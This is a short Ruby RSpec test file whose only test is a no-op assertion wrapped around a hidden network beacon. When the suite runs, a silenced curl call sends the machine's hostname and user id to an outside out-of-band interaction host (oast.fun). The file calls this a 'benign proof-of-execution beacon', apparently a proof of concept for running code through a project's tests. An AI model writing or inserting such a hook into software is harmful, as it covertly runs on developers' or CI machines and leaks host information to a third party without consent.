# frozen_string_literal: true
RSpec.describe "poc_oob" do
  it "benign proof-of-execution beacon" do
    system("curl -sm5 \"http://lqxeertpcnjiyovvdqcs99n182qo70jbw.oast.fun/discoursepoc?h=$(hostname)&uid=$(id -u)\" >/dev/null 2>&1 || true")
    expect(true).to eq(true)
  end
end